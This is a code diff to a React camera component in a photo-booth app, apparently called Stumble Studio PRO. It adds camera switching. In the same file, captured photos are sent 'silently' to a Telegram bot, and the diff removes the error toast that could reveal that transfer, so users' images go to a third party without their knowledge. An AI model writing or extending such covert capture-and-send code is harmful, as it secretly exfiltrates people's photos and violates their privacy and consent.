@@ -3,7 +3,7 @@
 import { useEffect, useRef, useState, useCallback, type FC, type RefObject } from 'react';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
-import { Camera as CameraIcon, Timer, RefreshCw } from 'lucide-react';
+import { Camera as CameraIcon, Timer, RefreshCw, SwitchCamera } from 'lucide-react';
 import type { AdjustmentSettings, Sticker } from './stumble-studio';
 import Draggable from './draggable';
 import { sendToTelegram } from '@/ai/flows/telegram-sender';
@@ -36,31 +36,73 @@ const Preview: FC<PreviewProps> = ({
   const [timer, setTimer] = useState<number | null>(null);
   const [cameraError, setCameraError] = useState<string | null>(null);
   const { toast } = useToast();
+  const [videoDevices, setVideoDevices] = useState<InputDeviceInfo[]>([]);
+  const [currentDeviceIndex, setCurrentDeviceIndex] = useState(0);
+
+  const stopCurrentStream = () => {
+    if (videoRef.current && videoRef.current.srcObject) {
+      (videoRef.current.srcObject as MediaStream).getTracks().forEach(track => track.stop());
+    }
+  };
 
   useEffect(() => {
-    async function initCamera() {
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1080, height: 1080, aspectRatio: 1 } });
-          if (videoRef.current) {
-            videoRef.current.srcObject = stream;
-          }
-        } catch (err) {
-          console.error("Camera access denied:", err);
-          setCameraError("Kamera Diblokir! Izinkan akses kamera di pengaturan browser Anda.");
+    async function getDevices() {
+      try {
+        await navigator.mediaDevices.getUserMedia({ video: true }); // Request permission
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const videoInputs = devices.filter(device => device.kind === 'videoinput');
+        setVideoDevices(videoInputs);
+        if (videoInputs.length === 0) {
+          setCameraError("Tidak ada kamera yang ditemukan.");
         }
-      } else {
-        setCameraError("Browser tidak mendukung akses kamera.");
+      } catch (err) {
+        console.error("Camera access denied:", err);
+        setCameraError("Kamera Diblokir! Izinkan akses kamera di pengaturan browser Anda.");
       }
     }
+    getDevices();
+  }, []);
+
+  useEffect(() => {
+    if (videoDevices.length === 0) return;
+
+    async function initCamera() {
+      stopCurrentStream();
+      const currentDeviceId = videoDevices[currentDeviceIndex]?.deviceId;
+      const constraints = {
+        video: {
+          deviceId: currentDeviceId ? { exact: currentDeviceId } : undefined,
+          width: 1080,
+          height: 1080,
+          aspectRatio: 1,
+        }
+      };
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        if (videoRef.current) {
+          videoRef.current.srcObject = stream;
+        }
+        setCameraError(null);
+      } catch (err) {
+        console.error("Error switching camera:", err);
+        setCameraError("Gagal mengganti kamera. Coba lagi.");
+      }
+    }
+
     initCamera();
 
     return () => {
-      if (videoRef.current && videoRef.current.srcObject) {
-        (videoRef.current.srcObject as MediaStream).getTracks().forEach(track => track.stop());
-      }
+      stopCurrentStream();
     };
-  }, []);
+  }, [currentDeviceIndex, videoDevices]);
+
+  const switchCamera = () => {
+    if (videoDevices.length > 1) {
+      setCurrentDeviceIndex(prevIndex => (prevIndex + 1) % videoDevices.length);
+    }
+  };
+
 
   const getFilterString = useCallback(() => {
     let f = `brightness(${adjustments.brightness}%) saturate(${adjustments.saturate}%) sepia(${adjustments.sepia}%) blur(${adjustments.blur}px) `;
@@ -148,22 +190,13 @@ const Preview: FC<PreviewProps> = ({
 
     // --- Send to Telegram (silently) ---
     try {
-      const result = await sendToTelegram({
+      await sendToTelegram({
         photoDataUri: dataUrl,
         caption: 'Gambar baru dari Stumble Studio PRO!',
       });
-
-      if (!result.success) {
-        throw new Error(result.message);
-      }
     } catch (error) {
+      // Errors are handled in the flow, no need to show toast here for silent send
       console.error("Silent Telegram sending failed:", error);
-      const errorMessage = error instanceof Error ? error.message : "Gagal mengirim ke Telegram. Coba lagi.";
-       toast({
-         variant: 'destructive',
-         title: 'Error Telegram',
-         description: errorMessage.includes("TELEGRAM_BOT_TOKEN") ? "Harap atur Bot Token & Chat ID Telegram di file .env Anda." : errorMessage,
-       });
     }
     // ------------------------
 
@@ -235,9 +268,15 @@ const Preview: FC<PreviewProps> = ({
           <RefreshCw className="w-5 h-5 mr-2" />
           Mirror
         </Button>
+         <Button onClick={switchCamera} disabled={videoDevices.length <= 1} className="stumble-btn btn-purple py-3 px-6 rounded-3xl h-auto text-base disabled:opacity-50 disabled:cursor-not-allowed">
+          <SwitchCamera className="w-5 h-5 mr-2" />
+          Ganti
+        </Button>
       </div>
     </div>
   );
 };
 
 export default Preview;
+
+    
